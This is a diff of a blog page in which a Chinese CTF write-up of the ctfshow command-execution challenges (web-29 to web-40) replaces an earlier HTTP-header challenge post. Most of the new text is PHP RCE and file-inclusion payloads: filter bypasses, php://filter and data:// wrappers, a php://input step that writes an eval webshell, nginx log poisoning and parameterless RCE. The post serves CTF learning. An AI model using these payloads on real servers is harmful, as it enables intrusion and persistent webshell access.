@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>极客大挑战2019Http | MIXBP</title>
-  <meta name="keywords" content=" 做题笔记 , http协议 ">
-  <meta name="description" content="极客大挑战2019Http | MIXBP">
+  <title>ctfshow-命令执行 | MIXBP</title>
+  <meta name="keywords" content=" 做题笔记 , 命令执行 ">
+  <meta name="description" content="ctfshow-命令执行 | MIXBP">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="web-命令执行web-29 发现过滤了flag关键字，这里使用*模糊匹配就行了 1?c&#x3D;system(&#x27;cat fla*&#x27;);  web-30 又过滤了system和php关键字，我们把system换成passthru加上模糊匹配即可 1?c&#x3D;passthru(&#x27;cat fla*&#x27;);  web-31 这里又把cat、单引号和空格过滤了，可以把cat换成t">
 <meta property="og:type" content="article">
@@ -516,9 +516,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-极客大挑战2019Http" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-ctfshow-命令执行" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">极客大挑战2019Http</h1>
+        <h1 class="article-title">ctfshow-命令执行</h1>
     
     <div class="article-meta">
         
@@ -530,19 +530,19 @@
             
             <a class="color5">做题笔记</a>
             
-            <a class="color2">http协议</a>
+            <a class="color5">命令执行</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2025-01-09 17:12:05'>2025-01-09 16:47</time>
+            Created At : <time class="date" title='Updated At: 2025-02-17 01:36:17'>2025-02-17 00:00</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:303</span>
+        <span>Count:945</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -572,7 +572,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">web-命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-29"><span class="toc-text">web-29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-30"><span class="toc-text">web-30</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-31"><span class="toc-text">web-31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-32"><span class="toc-text">web-32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-33"><span class="toc-text">web-33</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-34"><span class="toc-text">web-34</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-35"><span class="toc-text">web-35</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-36"><span class="toc-text">web-36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-37"><span class="toc-text">web-37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-38"><span class="toc-text">web-38</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-39"><span class="toc-text">web-39</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-40"><span class="toc-text">web-40</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -588,35 +588,55 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>首先打开靶机，发现一个链接</p>
-<p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http1.png"></p>
-<p>进入发现是一个招新页面</p>
-<p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http2.png"></p>
-<p>查看源代码发现一个隐藏的超链接指向secret.php</p>
-<p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http3.png"></p>
-<p>点开发现显示我们不是从<a target="_blank" rel="noopener" href="https://sycsecret.buuoj.cn跳转过来的/">https://Sycsecret.buuoj.cn跳转过来的</a></p>
-<p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http4.png"></p>
-<p>这时候就想到referer头的作用</p>
-<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">Referer</span>头在HTTP请求中主要用于指示当前请求的来源页面，帮助服务器了解用户是从哪个页面跳转而来的‌<br></code></pre></td></tr></table></figure>
+        <h1 id="web-命令执行"><a href="#web-命令执行" class="headerlink" title="web-命令执行"></a>web-命令执行</h1><h2 id="web-29"><a href="#web-29" class="headerlink" title="web-29"></a>web-29</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1.png"></p>
+<p>发现过滤了flag关键字，这里使用*模糊匹配就行了</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat fla*&#x27;</span>);<br></code></pre></td></tr></table></figure>
 
-<p>使用hackbar修改Referer头,用burpsuite也可</p>
-<p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http5.png"></p>
-<p>修改完成后又显示请使用”Syclover” 浏览器</p>
-<p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http6.png"></p>
-<p>这时就想到user-agent的作用</p>
-<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">User</span>-Agent（用户代理）在HTTP请求中起着重要作用，主要用于标识发送请求的客户端信息，包括网络、浏览器类型、版本号等‌。具体来说，<span class="hljs-keyword">User</span>-Agent的作用包括以下几个方面：‌<span class="hljs-number">12</span><br></code></pre></td></tr></table></figure>
+<h2 id="web-30"><a href="#web-30" class="headerlink" title="web-30"></a>web-30</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2.png"></p>
+<p>又过滤了system和php关键字，我们把system换成passthru加上模糊匹配即可</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=passthru(<span class="hljs-string">&#x27;cat fla*&#x27;</span>);<br></code></pre></td></tr></table></figure>
 
-<p>使用hackbar修改user-agent</p>
-<p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http7.png"></p>
-<p>重新打开网页又显示只能在本地阅读</p>
-<p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http8.png"></p>
-<p>这时就想到x-forwarded-for</p>
-<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">X-Forwarded-For（XFF）的作用主要是帮助服务器获取通过HTTP代理或负载均衡方式连接到Web服务器的客户端的原始<span class="hljs-built_in">IP</span>地址<br></code></pre></td></tr></table></figure>
+<h2 id="web-31"><a href="#web-31" class="headerlink" title="web-31"></a>web-31</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-3.png"></p>
+<p>这里又把cat、单引号和空格过滤了，可以把cat换成tac然后用url编码%09绕过空格过滤，然后使用双引号闭合</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=passthru(<span class="hljs-string">&quot;tac%09fla*&quot;</span>);<br></code></pre></td></tr></table></figure>
 
-<p>使用hackbar修改X-Forwarded-For为127.0.0.1或者localhost</p>
-<p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http9.png"></p>
-<p>得到flag</p>
-<p><img src="/../image/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http10.png"></p>
+<h2 id="web-32"><a href="#web-32" class="headerlink" title="web-32"></a>web-32</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-4.png"></p>
+<p>这题过滤了更多东西。这里可以通过文件包含（伪协议）和变量覆盖来写，因为include包含函数是可以包含变量的$_GET[1]不加括号是因为，include把$__GET[1]当做一个变量来看，变量的内容由1来确定，1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php是通过get请求传入的参数，内容是一个文件包含，以base64形式返回</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-string">?&gt;</span>&amp;<span class="hljs-number">1</span>=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/convert</span>.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure>
+
+<h2 id="web-33"><a href="#web-33" class="headerlink" title="web-33"></a>web-33</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-5.png"></p>
+<p>和上一题差不多，但是可以用另一种方法，文件包含<strong>data:&#x2F;&#x2F;协议</strong></p>
+<p>类似与php:&#x2F;&#x2F;input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。从而导致任意代码执行。</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?c=include$_GET[1]?&gt;&amp;1=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<h2 id="web-34"><a href="#web-34" class="headerlink" title="web-34"></a>web-34</h2><p>和上一题一样，但是我们换一种方法，文件包含php:&#x2F;&#x2F;input伪协议来做</p>
+<p>利用该方法可以直接写入php文件，比如url中输入?file&#x3D;php:&#x2F;&#x2F;input，然后使用burp抓包，在POST请求中写入php代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-meta">?&gt;</span>&amp;<span class="hljs-number">1</span>=php:<span class="hljs-comment">//input</span><br><br>抓包在post请求中写入<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;mixbp&quot;])?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这样就会在服务器端自动生成我们的一句话木马文件，然后用蚁剑连接即可拿到flag</p>
+<h2 id="web-35"><a href="#web-35" class="headerlink" title="web-35"></a>web-35</h2><p>和前几个题一样</p>
+<h2 id="web-36"><a href="#web-36" class="headerlink" title="web-36"></a>web-36</h2><p>和前几个题相比多过滤了0-9，把GET方法中的参数改为a即可。</p>
+<p><strong>使用日志包含也可以，用文件包含去包含nginx默认的access日志路径，然后访问该路径抓包，在UA头里写入一句话木马，然后用蚁剑连接即可</strong></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[a]<span class="hljs-string">?&gt;</span>&amp;a=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/convert</span>.base64-encode/resource=flag.php<br><br>日志包含<br><span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[a]<span class="hljs-string">?&gt;</span>&amp;a=<span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/access</span>.log<br></code></pre></td></tr></table></figure>
+
+<h2 id="web-37"><a href="#web-37" class="headerlink" title="web-37"></a>web-37</h2><p><img src="/../image/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-6.png"></p>
+<p>这里eval换成了include，很明显要用文件包含，但是过滤了flag关键字，所以可以使用文件包含<strong>data:&#x2F;&#x2F;协议</strong>，将我们的代码通过base64加密后再输入，这样就能绕过flag关键字过滤了</p>
+<p>语法为data:&#x2F;&#x2F;text&#x2F;plain;base64,代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=data:<span class="hljs-comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br><br>PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==即为<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat flag,php&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="web-38"><a href="#web-38" class="headerlink" title="web-38"></a>web-38</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-7.png"></p>
+<p>比上题多过滤了个php和file关键字，使用上题的payload即可</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/</span>Pg==<br></code></pre></td></tr></table></figure>
+
+<h2 id="web-39"><a href="#web-39" class="headerlink" title="web-39"></a>web-39</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-8.png"></p>
+<p>源码会在我们的$c后拼接一个’.php’，但是拼接的php可以不用管,include只会处理<code>&lt;?php ?&gt;</code>内部的内容</p>
+<p>但是这里试了一下好像不能用base64加密绕过了，所以使用模糊匹配绕过关键字过滤</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;tac fla*&quot;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<h2 id="web-40"><a href="#web-40" class="headerlink" title="web-40"></a>web-40</h2><p><img src="/../image/"></p>
+<p>看到题目被吓到了以为过滤了小括号，结果发现是中文括号，这里可以使用无参数RCE绕过或者scandir()文件读取都行</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">无参数RCE<br>?c=<span class="hljs-keyword">eval</span>(end(<span class="hljs-keyword">pos</span>(get_defined_vars())));&amp;cmd=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);<br><br>或者<br><br>scandir()文件读取<br>首先，查看当前目录下文件<br>print_r(scandir(current(localeconv())));<br>发现flag.php在第二位，直接show_source读取<br>show_source(<span class="hljs-keyword">next</span>(array_reverse(scandir(current(localeconv())))));<br></code></pre></td></tr></table></figure>
+
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
